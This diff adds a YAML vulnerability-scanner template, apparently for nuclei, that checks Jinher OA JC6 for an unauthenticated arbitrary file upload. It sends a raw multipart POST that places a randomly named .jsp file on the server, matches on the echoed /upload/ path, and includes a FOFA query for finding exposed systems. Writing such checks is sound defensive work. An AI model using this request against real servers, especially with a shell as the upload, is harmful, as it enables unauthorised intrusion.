@@ -1,0 +1,45 @@
+id: jinher-jc6-servlet-upload-fileupload
+
+info:
+  name: 金和 OA JC6 servlet/Upload 任意文件上传
+  author: zan8in
+  severity: critical
+  description: |
+    金和 OA /jc6/servlet/Upload 未授权可上传文件，响应回显 /upload/ 路径与 pubFileName。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="金和网络-金和OA"
+  tags: jinher,jc6,fileupload
+
+variables:
+  filename: "{{rand_base(6)}}"
+  bodystr: "{{rand_base(16)}}"
+  boundary: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
+
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="img"; filename="{{filename}}.jsp"
+        Content-Type: image/jpeg
+
+        {{bodystr}}
+        ------WebKitFormBoundary{{boundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "arr[0]=parent.pubFileName"
+          - "arr[1]=parent.pubBz"
+          - "arr[2]='/upload/"
+        condition: and
+      - type: status
+        status:
+          - 200
